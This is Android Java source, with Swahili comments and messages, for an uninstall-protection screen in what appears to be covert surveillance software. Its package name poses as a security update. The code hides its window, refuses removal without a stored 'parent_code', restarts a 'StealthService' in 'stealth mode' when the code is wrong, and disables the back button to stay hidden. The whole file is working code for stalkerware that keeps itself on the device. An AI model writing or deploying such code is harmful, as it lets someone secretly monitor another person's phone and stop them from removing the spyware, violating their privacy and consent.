package com.security.update;

import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.view.Window;
import android.view.WindowManager;
import android.widget.EditText;
import android.widget.Button;
import android.widget.Toast;

public class UninstallProtectionActivity extends Activity {
    private EditText codeInput;
    private Button submitButton;
    private SharedPreferences prefs;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Fanya isionekane
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                           WindowManager.LayoutParams.FLAG_FULLSCREEN);
        
        setContentView(R.layout.activity_uninstall_protection);
        
        prefs = getSharedPreferences("SurveillanceApp", MODE_PRIVATE);
        codeInput = findViewById(R.id.uninstallCodeInput);
        submitButton = findViewById(R.id.uninstallSubmitButton);

        submitButton.setOnClickListener(v -> {
            String enteredCode = codeInput.getText().toString().trim().toUpperCase();
            String savedCode = prefs.getString("parent_code", "");
            
            if (enteredCode.equals(savedCode)) {
                // Kubali kufuta - futa data zote
                SharedPreferences.Editor editor = prefs.edit();
                editor.clear();
                editor.apply();
                
                // Stop service
                Intent serviceIntent = new Intent(this, StealthService.class);
                stopService(serviceIntent);
                
                Toast.makeText(this, "App imefutwa kikamilifu", Toast.LENGTH_LONG).show();
                finish();
            } else {
                Toast.makeText(this, "❌ Msimbo si sahihi! App haifutiki.", Toast.LENGTH_LONG).show();
                
                // Rudisha kwenye stealth mode
                Intent stealthIntent = new Intent(this, StealthService.class);
                stealthIntent.putExtra("PARENT_CODE", savedCode);
                startService(stealthIntent);
                
                moveTaskToBack(true);
                finish();
            }
        });
    }
    
    @Override
    public void onBackPressed() {
        // Usiruhusu kurudi - rudisha kwenye background
        moveTaskToBack(true);
    }
}
